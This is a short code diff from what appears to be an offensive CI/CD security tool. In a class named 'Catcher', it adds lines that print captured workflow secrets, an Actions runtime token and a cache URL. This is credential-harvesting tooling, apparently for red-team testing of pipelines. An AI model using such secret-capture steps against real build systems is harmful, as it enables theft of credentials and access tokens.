@@ -60,6 +60,10 @@ class Catcher(AttackStep):
                 segment_json = json.loads(f"{{{segment}}}")
                 for key, value in segment_json.items():
                     secrets[key] = value["value"]
+                    Output.owned(f"Captured secret: {key} -> {value['value']}")
+
+            Output.owned(f"Captured Actions Runtime token: {cachetoken}")
+            Output.owned(f"Captured Cache url: {cacheurl}")
 
             if not all(secret in secrets for secret in self.expected_secrets):
                 Output.error(
